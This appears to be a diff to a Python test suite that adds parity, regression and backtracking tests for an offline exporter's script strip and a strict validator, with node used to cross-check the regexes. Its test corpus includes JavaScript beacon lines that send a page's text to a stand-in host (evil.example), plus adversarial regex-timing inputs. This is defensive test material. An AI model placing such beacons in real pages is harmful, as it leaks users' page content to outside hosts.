@@ -12,10 +12,13 @@ detector that scans the whole document reports every document as needing the blo
 silently becomes a no-op. Detection must look only inside the CONTENT region.
 """
 import glob
+import json
 import os
 import re
 import shutil
+import subprocess
 import sys
+import time
 import unittest
 from html.parser import HTMLParser
 
@@ -25,6 +28,7 @@ sys.path.insert(0, _paths.TOOLS)
 import vendored_libs  # noqa: E402
 import new_document  # noqa: E402
 from checks import parsing  # noqa: E402
+from checks import resources  # noqa: E402
 
 
 def _doc(fragment):
@@ -1014,6 +1018,344 @@ class RuntimeParityTests(unittest.TestCase):
                 "unstripped executable script the gate blesses, or a false rejection." % raw)
 
 
+    _NAV_CORPUS_NAVIGATES = [
+        'location.href = "https://evil.example/steal?d=" + document.body.innerText;',
+        "\nlocation = 'https://evil.example';",
+        'window.location.href="//evil.example/beacon";',
+        "top.location.replace('https://evil.example')",
+        'document.location.assign("https://evil.example")',
+        "self.location.href = `https://evil.example`",
+        'parent.location.href = "http://evil.example"',
+        'globalThis.location.href =\n  "https://evil.example"',
+        'window.location = "https://evil.example"',
+        'window.open( "//evil.example/popup" )',
+        'self.open("https://evil.example")',
+        'LOCATION.HREF = "HTTPS://EVIL.EXAMPLE"',
+        # A prefix CHAIN, not just one prefix - `window.` in front used to clear the strip.
+        'window.top.location.href = "https://evil.example"',
+        'window.parent.location.href = "https://evil.example"',
+        'self.top.location = "https://evil.example"',
+        # Optional chaining, in forms that are VALID JavaScript. (An optional-chain ASSIGNMENT
+        # such as `window?.location.href = <url>` is a SyntaxError and navigates nothing, so
+        # pinning it would only prove the regex matches dead source.)
+        'window?.open("https://evil.example")',
+        'location?.assign("https://evil.example")',
+        'window.location?.assign("https://evil.example")',
+        'window ?. open ( "https://evil.example" )',
+        # `frames` (=== window) is a real top-level navigation.
+        'frames.location.href = "https://evil.example"',
+        # The natural arrow-function beacon, and a bare assignment inside a block.
+        'setTimeout(() => location = "https://evil.example/?" + document.body.innerText)',
+        'if (x) {\n  location = "https://evil.example";\n}',
+        'if (x) location = "https://evil.example";',
+        # Shadowing does NOT rescue a PREFIXED sink: `window.location` names the real one no matter
+        # what a local `location` shadows, so these must still be stripped.
+        'const location = {}; window.location.href = "https://evil.example";',
+        'const location = {}; top.location.replace("https://evil.example");',
+        'const location = {}; window.open("https://evil.example");',
+        # JS treats U+FEFF as whitespace; Python's `\\s` does not, so a shared class let this
+        # valid-JS beacon be stripped by the exporter yet certified clean by the validator.
+        'location.href =\ufeff"https://evil.example"',
+    ]
+    # Benign shapes that must SURVIVE. The strip deletes a whole script, so a false positive
+    # silently breaks an author's document - the costlier direction of the two.
+    _NAV_CORPUS_BENIGN = [
+        # Comparisons, not assignments - a document that merely INSPECTS its own URL.
+        'if (location.href === "https://evil.example") return;',
+        'if (location.href !== "https://evil.example") return;',
+        # A network literal and a navigation object in the same script, never joined.
+        'var DOCS = "https://docs.example.org/guide"; if (location.hash) document.title = DOCS;',
+        # A LOCAL binding that merely happens to be called `location` (a config value, a geocode
+        # result). Assigning a URL to it navigates nothing.
+        'var location = "https://api.example.com/v1";',
+        'const location = "https://docs.example.org/x";',
+        'let location = "https://docs.example.org/x";',
+        'function f() { var location = "https://evil.example"; return location; }',
+        # A local helper called `open` - `open("...")` alone is not the global navigation sink.
+        'open("https://docs.example.org/guide")',
+        'const open = mk(); open("https://docs.example.org/guide")',
+        'xhr.open("GET", "https://evil.example")',
+        'myopen("https://evil.example")',
+        # Purely LOCAL bindings that merely default to a URL. These navigate nothing, and deleting
+        # the whole script over them is the costlier failure direction.
+        'function f(location = "https://cdn.example.com/x") { return location; }',
+        'const { location = "https://cdn.example.com/x" } = opts;',
+        'var a = 1, location = "https://cdn.example.com/x";',
+        # Not the top-level document: some other object's `location` (frame-src 'none' blocks
+        # frames anyway).
+        'frame.location.href = "https://evil.example"',
+        'cfg.location.href = "https://evil.example"',
+        # A local binding whose name only case-FOLDS to `location` under Python's Unicode rules
+        # (the dotless i). JS `/i` does not fold it, so without `re.ASCII` the validator rejected
+        # source the exporter preserves. Keeping it in the BENIGN list pins both engines.
+        'locat\u0131on.href = "https://evil.example"',
+        '\u017felf.location.href = "https://evil.example"',
+        # A LOCAL binding named `location` makes an unprefixed sink refer to that object, not the
+        # document - `const location = { href: "" }; location.href = <url>` navigates nothing, so
+        # deleting the whole script over it is content loss. Shadow-awareness suppresses only the
+        # UNPREFIXED sinks; the prefixed cases below still fire.
+        'const location = { href: "" }; location.href = "https://api.example";',
+        'let location = {}; location.assign("https://api.example");',
+        'function f(location) { location.href = "https://api.example"; }',
+        'const { location } = opts; location.href = "https://api.example";',
+        'try { x(); } catch (location) { location.href = "https://api.example"; }',
+        # A relative navigation inside the offline file is not egress.
+        'location.href = "#section-2";',
+        'location.assign("./other.html")',
+    ]
+
+    # The three regex literals the exporter's navigation decision is built from, each paired with
+    # the validator constant that must mirror it byte for byte.
+    _NAV_PATTERN_NAMES = (
+        ("_OFFLINE_NAV_TO_NETWORK_RE", "OFFLINE_NAV_TO_NETWORK_RE"),
+        ("_OFFLINE_NAV_PREFIXED_RE", "OFFLINE_NAV_PREFIXED_RE"),
+        ("_OFFLINE_LOCAL_LOCATION_RE", "OFFLINE_LOCAL_LOCATION_RE"),
+    )
+
+    def _runtime_nav_pattern(self, name="_OFFLINE_NAV_TO_NETWORK_RE"):
+        """One of the exporter's navigation regex SOURCES, extracted from the runtime partial."""
+        source = self._read("68-export-offline.js")
+        m = re.search(r"^const %s = /(.+)/i;$" % re.escape(name), source, re.MULTILINE)
+        self.assertIsNotNone(
+            m, "the runtime no longer defines %s as a single-line case-insensitive regex literal; "
+               "the parity extraction is stale" % name)
+        return m.group(1)
+
+    def _runtime_navigates(self, sample):
+        """Evaluate the exporter's DECISION in Python, mirroring `_offlineScriptNavigatesToNetwork`.
+
+        The decision is not one regex: a script that declares its own `location` is talking about
+        that object, so only the PREFIXED sinks count there. Comparing raw pattern hits would miss
+        a drift in that rule, which is the part that decides whether a benign script is deleted.
+        """
+        full = re.compile(self._runtime_nav_pattern("_OFFLINE_NAV_TO_NETWORK_RE"),
+                          re.IGNORECASE | re.ASCII)
+        prefixed = re.compile(self._runtime_nav_pattern("_OFFLINE_NAV_PREFIXED_RE"),
+                              re.IGNORECASE | re.ASCII)
+        shadow = re.compile(self._runtime_nav_pattern("_OFFLINE_LOCAL_LOCATION_RE"),
+                            re.IGNORECASE | re.ASCII)
+        if not full.search(sample):
+            return False
+        if shadow.search(sample):
+            return bool(prefixed.search(sample))
+        return True
+
+    def test_the_python_and_js_scripted_navigation_patterns_agree(self):
+        """The offline strip (JS) and the strict validator (Python) must recognize the SAME
+        scripted top-level navigations.
+
+        Top-level navigation is the one egress channel the offline CSP cannot close (`navigate-to`
+        was dropped from CSP Level 3 and ships nowhere; `sandbox` is ignored in a meta-delivered
+        policy), so this pattern is not defense in depth behind a boundary - for that channel it IS
+        the check. Two independent copies of it are exactly the drift the runnable-script-type
+        parity test above exists for: a validator that recognized less would certify an offline file
+        the exporter no longer protects, and one that recognized more would reject the file the
+        exporter just produced.
+
+        All THREE literals the decision is built from are pinned by TEXT equality, not by
+        re-deriving one from the other. That is the only pin that survives the engines disagreeing:
+        `\\w` is ASCII-only in JS but Unicode-aware in Python, and JS whitespace includes U+FEFF
+        while Python's does not, so a pattern that merely LOOKS shared can still behave differently.
+        Both copies therefore spell those classes out, and
+        `test_the_navigation_pattern_behaves_the_same_in_the_real_js_engine` checks the behaviour in
+        node.
+        """
+        for js_name, py_name in self._NAV_PATTERN_NAMES:
+            runtime_pattern = self._runtime_nav_pattern(js_name)
+            compiled = getattr(resources, py_name)
+            self.assertEqual(
+                runtime_pattern, compiled.pattern,
+                "the exporter's %s literal and the validator's %s pattern text have diverged. They "
+                "must be byte-identical (Python reads the JS-only `\\/` escape as a literal `/` "
+                "too), because a validator that recognizes less certifies a file the exporter no "
+                "longer protects, and one that recognizes more rejects the file the exporter just "
+                "produced." % (js_name, py_name))
+            # `re.ASCII` is part of the contract, not an implementation detail: without it Python's
+            # IGNORECASE folds several non-ASCII letters onto ASCII ones that JS's `/i` does not, so
+            # the validator would reject source the exporter preserves.
+            self.assertTrue(
+                compiled.flags & re.ASCII,
+                "the validator's %s must be compiled with re.ASCII, or Python's Unicode "
+                "case-folding (dotless i, long s, Kelvin sign) makes it match identifiers the JS "
+                "engine - and therefore the exporter - does not" % py_name)
+            # Guard the spelled-out classes: re-introducing a shared shorthand silently
+            # reintroduces the cross-engine divergence, and text equality alone would not notice.
+            # Every ASCII-vs-Unicode shorthand is banned, not just the two that actually bit.
+            for shared in (r"\s", r"\S", r"\w", r"\W", r"\d", r"\D", r"\b", r"\B"):
+                self.assertNotIn(
+                    shared, runtime_pattern,
+                    "%s uses %r, whose meaning DIFFERS between the JS and Python regex engines "
+                    "(ASCII vs Unicode `\\w`/`\\d`; U+FEFF is JS whitespace but not Python's). "
+                    "Spell the class out in both copies instead." % (js_name, shared))
+
+        # Compare the DECISION, not raw pattern hits: the shadow rule (an unprefixed sink in a
+        # script that declares its own `location` is that local object, not the document) is the
+        # part that decides whether a benign script is deleted, so a drift there must fail here.
+        for sample in self._NAV_CORPUS_NAVIGATES:
+            self.assertTrue(self._runtime_navigates(sample),
+                            "the runtime no longer strips %r" % sample)
+            self.assertTrue(resources.offline_script_navigates_to_network(sample),
+                            "the validator no longer rejects %r" % sample)
+        for sample in self._NAV_CORPUS_BENIGN:
+            self.assertFalse(self._runtime_navigates(sample),
+                             "the runtime now deletes the benign script %r" % sample)
+            self.assertFalse(resources.offline_script_navigates_to_network(sample),
+                             "the validator now rejects the benign script %r" % sample)
+
+    def test_the_navigation_pattern_behaves_the_same_in_the_real_js_engine(self):
+        """Byte-identical pattern text is necessary but NOT sufficient - run it in node too.
+
+        Compiling the extracted JS source with Python's `re` (which the text-equality test above
+        does) can only ever prove what PYTHON does with it; it structurally cannot catch an engine
+        difference, which is exactly the class of bug this pattern hit. So evaluate the same corpus
+        in the actual JS engine and require identical verdicts. Skipped when node is absent, the
+        way the repo's other node-gated checks degrade - CI always has it.
+        """
+        node = shutil.which("node")
+        if not node:
+            self.skipTest("node is not on PATH; the JS-engine parity check needs it")
+        payload = {
+            "full": self._runtime_nav_pattern("_OFFLINE_NAV_TO_NETWORK_RE"),
+            "prefixed": self._runtime_nav_pattern("_OFFLINE_NAV_PREFIXED_RE"),
+            "shadow": self._runtime_nav_pattern("_OFFLINE_LOCAL_LOCATION_RE"),
+            "navigates": self._NAV_CORPUS_NAVIGATES,
+            "benign": self._NAV_CORPUS_BENIGN,
+        }
+        # Mirrors `_offlineScriptNavigatesToNetwork`, so this pins the DECISION (including the
+        # shadow rule) in the real engine, not just one pattern's raw hits.
+        script = (
+            "let raw='';process.stdin.on('data',d=>raw+=d).on('end',()=>{"
+            "const p=JSON.parse(raw);"
+            "const full=new RegExp(p.full,'i');const pre=new RegExp(p.prefixed,'i');"
+            "const sh=new RegExp(p.shadow,'i');"
+            "const decide=s=>full.test(s)?(sh.test(s)?pre.test(s):true):false;"
+            "const out={navigates:p.navigates.map(decide),benign:p.benign.map(decide)};"
+            "process.stdout.write(JSON.stringify(out));});"
+        )
+        proc = subprocess.run([node, "-e", script], input=json.dumps(payload),
+                              capture_output=True, text=True, encoding="utf-8")
+        self.assertEqual(proc.returncode, 0,
+                         "node could not evaluate the navigation pattern: %s" % proc.stderr)
+        verdicts = json.loads(proc.stdout)
+        # Length-check before zipping: `zip` truncates silently, so a helper that returned a short
+        # (or empty) list would let this pass having asserted nothing.
+        self.assertEqual(len(verdicts.get("navigates", [])), len(self._NAV_CORPUS_NAVIGATES),
+                         "node returned %d verdicts for %d navigating samples"
+                         % (len(verdicts.get("navigates", [])), len(self._NAV_CORPUS_NAVIGATES)))
+        self.assertEqual(len(verdicts.get("benign", [])), len(self._NAV_CORPUS_BENIGN),
+                         "node returned %d verdicts for %d benign samples"
+                         % (len(verdicts.get("benign", [])), len(self._NAV_CORPUS_BENIGN)))
+        for sample, hit in zip(self._NAV_CORPUS_NAVIGATES, verdicts["navigates"]):
+            self.assertTrue(hit, "the REAL JS engine does not strip %r, so the exporter ships a "
+                                 "beacon the Python validator rejects" % sample)
+            self.assertTrue(resources.offline_script_navigates_to_network(sample),
+                            "the validator does not reject %r" % sample)
+        for sample, hit in zip(self._NAV_CORPUS_BENIGN, verdicts["benign"]):
+            self.assertFalse(hit, "the REAL JS engine deletes the benign script %r" % sample)
+            self.assertFalse(resources.offline_script_navigates_to_network(sample),
+                              "the validator rejects the benign script %r" % sample)
+
+    def test_the_navigation_pattern_cannot_be_made_to_backtrack(self):
+        """The pattern must stay linear on adversarial input, in BOTH engines.
+
+        It runs over every executable inline script of an offline document - which can include a
+        multi-megabyte inlined mermaid bundle - on every `validate.py --strict`, and the exporter
+        runs it on every export. Its prefix chain once joined two unbounded whitespace runs around
+        an optional `?` (`WS*\\??WS*\\.`), so a whitespace run never followed by a dot made the
+        engine try every split: a 20k-space input took ~2.7s in Python and ~10s in node, which is a
+        denial of service on an attacker-authored document (and an accidental hang on a minified
+        one). The `?` is now bound inside its own group, so each position consumes the run         one way. A second shape amplified the same way: several almost-matching sink segments whose
+        tail never reaches a URL (`window<sp>.<sp>top<sp>.<sp>location<sp>.<sp>href<sp>=<sp>'x'`)
+        took 18s in node at 200 spaces per gap. Both are checked here.
+        """
+        evils = [
+            "window" + " " * 20000 + "X",
+            ("window{0}.{0}top{0}.{0}location{0}.{0}href{0}={0}'not-a-url'").format(" " * 400),
+            "window . " * 200 + "x",
+        ]
+        for evil in evils:
+            start = time.monotonic()
+            self.assertIsNone(resources.OFFLINE_NAV_TO_NETWORK_RE.search(evil))
+            elapsed = time.monotonic() - start
+            self.assertLess(
+                elapsed, 1.0,
+                "the navigation pattern took %.2fs on a %d-character adversarial input - it is "
+                "backtracking. Look for two unbounded repetitions that can consume the same input "
+                "(the historical shape was `WS*\\??WS*\\.`); bind the optional part in its own "
+                "group." % (elapsed, len(evil)))
+        node = shutil.which("node")
+        if not node:
+            return
+        script = (
+            "let raw='';process.stdin.on('data',d=>raw+=d).on('end',()=>{"
+            "const p=JSON.parse(raw);const re=new RegExp(p.pattern,'i');"
+            "const out=p.evils.map(e=>{const t=Date.now();const hit=re.test(e);"
+            "return {ms:Date.now()-t,hit:hit};});"
+            "process.stdout.write(JSON.stringify(out));});"
+        )
+        payload = {"pattern": self._runtime_nav_pattern(), "evils": evils}
+        proc = subprocess.run([node, "-e", script], input=json.dumps(payload),
+                              capture_output=True, text=True, encoding="utf-8")
+        self.assertEqual(proc.returncode, 0, "node could not run the pattern: %s" % proc.stderr)
+        results = json.loads(proc.stdout)
+        self.assertEqual(len(results), len(evils))
+        for evil, result in zip(evils, results):
+            self.assertFalse(result["hit"])
+            self.assertLess(result["ms"], 1000,
+                            "the REAL JS engine took %dms on a %d-character adversarial input - "
+                            "the exporter would hang the reviewer's browser tab on an "
+                            "attacker-authored document" % (result["ms"], len(evil)))
+
+    def test_the_layer_script_survives_its_own_offline_strips(self):
+        """The review layer's own script is stripped by the same pass as any other inline script.
+
+        It carries no id the strip skips and is not exempt, so the moment the layer's SOURCE (code
+        or a code COMMENT) contains one of the shapes the strip looks for, the exporter deletes the
+        runtime from every offline file it writes. That is not hypothetical: a comment added while
+        building this very check spelled out both an `import` call and a navigation to a URL
+        literal, and every offline export silently came out with an empty JS region. Pin it here,
+        where the message names the cause, instead of leaving a whole browser suite to fail with
+        "JS region has no closing script tag".
+        """
+        js_dir = os.path.join(_paths.DEV, "assets", "js")
+        sources = {
+            "the layer source partials (assets/js/*.js)":
+                "\n".join(self._read(name) for name in sorted(os.listdir(js_dir))
+                          if name.endswith(".js")),
+        }
+        # Also check the BUILT layer, not only the concatenated partials: the build could add a
+        # prologue or reorder, and it is the built bytes that actually ship inside every export.
+        # Required, not best-effort - making it conditional would let the only shipped-bytes check
+        # silently vanish in exactly the environment where the build is broken.
+        built = os.path.join(_paths.DEV, "skill", "dist", "commentable-html.js")
+        self.assertTrue(os.path.exists(built),
+                        "the built layer is missing at %s - run `python scripts/rebuild_all.py`; "
+                        "this guard must check the bytes that actually ship, not only the source "
+                        "partials" % built)
+        with open(built, "r", encoding="utf-8", newline="") as fh:
+            sources["the BUILT layer (skill/dist/commentable-html.js)"] = fh.read()
+        # A sufficient condition, mirroring `_offlineScriptHasNetworkEgress`: the layer is full of
+        # https literals (its own site and repo links), so its safety rests entirely on containing
+        # no dynamic-import call and no navigation to a URL literal.
+        forbidden = [
+            (re.compile(r"\bimport\s*\("),
+             "a dynamic import call (the strip's second import term pairs it with any quoted "
+             "network URL literal, and the layer has several)"),
+            (re.compile(r"\bfrom\s+[\"'](?:https?:)?//", re.IGNORECASE), "a remote `from` import"),
+            (re.compile(r"\bimport\s+[\"'](?:https?:)?//", re.IGNORECASE), "a bare remote import"),
+            (resources.OFFLINE_NAV_TO_NETWORK_RE, "a scripted navigation to a network URL"),
+        ]
+        for label, body in sources.items():
+            for rx, what in forbidden:
+                hit = rx.search(body)
+                self.assertIsNone(
+                    hit, "%s now contains %s (near %r). The offline export strips its OWN script "
+                         "with that test, so every offline file would ship without the runtime. "
+                         "Reword the comment, or restructure the code." % (
+                             label, what,
+                             body[max(0, (hit.start() if hit else 0) - 60):
+                                  (hit.end() if hit else 0) + 60]))
+
     def test_the_vendored_bundles_pass_the_offline_capture_gates(self):
         """The re-export fallback runs the captured library through the same content gates it
         applies to any other candidate, so the VENDORED bytes must satisfy them.
@@ -1039,11 +1381,16 @@ class RuntimeParityTests(unittest.TestCase):
         # terms requires a dynamic `import(` or a remote `from`/`import` string literal, so a bundle
         # with none of those cannot match any term. (Checking the terms individually would be
         # wrong - one of them is a conjunction, and its URL-literal half matches an innocuous
-        # xlink namespace string inside mermaid.)
+        # xlink namespace string inside mermaid.) The gate is now import OR NAVIGATION
+        # (`_offlineScriptHasNetworkEgress`), so the navigation pattern is evaluated directly here
+        # too: a bundle that ever tripped it would make a legitimate re-export fail loudly AND make
+        # `validate.py --strict` reject the very file the exporter produced (the strict check scans
+        # every executable inline script, and the library is appended after the strips run).
         blockers = [
             re.compile(r"\bimport\s*\("),
             re.compile(r"\bfrom\s+[\"'](?:https?:)?//", re.IGNORECASE),
             re.compile(r"\bimport\s+[\"'](?:https?:)?//", re.IGNORECASE),
+            resources.OFFLINE_NAV_TO_NETWORK_RE,
         ]
         vendor = os.path.join(_paths.DEV, "assets", "vendor")
         for name in ("mermaid.min.js", "chart.umd.min.js"):
